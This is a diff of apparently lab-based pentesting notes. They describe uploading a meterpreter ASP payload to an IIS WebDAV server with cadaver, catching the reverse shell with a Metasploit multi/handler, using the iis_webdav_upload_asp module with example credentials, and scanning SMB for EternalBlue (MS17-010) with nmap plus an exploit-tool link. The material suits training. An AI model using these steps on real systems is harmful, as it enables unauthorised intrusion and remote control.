@@ -30,12 +30,7 @@ Now... moving to **cadaver**
 	- use `put` to upload the file that you created: `put /root/meterpreter.asp `
 - before executing the malicious file we need to set up a listener/handler that will receive the reverse connection from target system and then send the stage which will give you a meterpreter session when executed 
 	- start up metasploit framework console session: `service postgresql start && msfconsole`
-		-  `"service postgresql start"`: This command starts the PostgreSQL service. PostgreSQL is an open-source relational database management system. The "service" command is used to manage system services in many Linux distributions. In this case, it's starting the PostgreSQL service.
-			- PostgreSQL is one of the supported databases for Metasploit, and it can be used as a data store for various features and functionalities within the framework. By default, Metasploit uses an SQLite database, but using PostgreSQL can offer better performance and scalability, especially when dealing with larger datasets or multiple concurrent users.
-			- The command `"service postgresql start"` is used to start the PostgreSQL service if it is installed on the system. It ensures that the PostgreSQL service is up and running, allowing Metasploit to connect to and utilize a PostgreSQL database.
-		- ` "&&"`: This is the logical AND operator in shell scripting. It allows you to execute multiple commands sequentially, with the second command executing only if the first command succeeds (i.e., returns an exit status of 0). If the first command fails, the second command won't be executed.
-		- `"msfconsole"`: This command launches the Metasploit Framework console. Metasploit is a widely-used open-source penetration testing framework that provides various tools for exploiting vulnerabilities in computer systems. The "msfconsole" command starts the interactive command-line interface for the Metasploit Framework, where you can execute various commands and modules for penetration testing purposes.
-		- By combining these commands using "&&", the shell will start the PostgreSQL service and, if successful, proceed to launch the Metasploit Framework console.
+		
 
 - Setting up handler/listener in metasploit by using metasploit module : 
 	- `use multi/handler `
@@ -51,7 +46,7 @@ delete shell.asp will delete the file, this is good to do once you have access, 
 
 We have a second option using metasploit 
 
-- `search` `iis` `upload` ![[Pasted image 20230703111527.png]]
+- `search` `iis` `upload` 
 - `use exploit/windows/iis/iis_webdav_upload_asp`
 	- set  HttpUsername bob  
 	- set  HttpPassword password_123321
@@ -135,7 +130,7 @@ open new tab
 Demo 
 
 - Nmap to check smb service: `**sudo nmap -sV -p 445 -O target** `
-	- -O to check operating system 
+	- `-O` to check operating system 
 - To check if target is vulnerable for eternal blue exploit use the following nmap script: `**sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target** `
 
 Manual exploitation: Tool used: https://github.com/3ndG4me/AutoBlue-MS17-010 
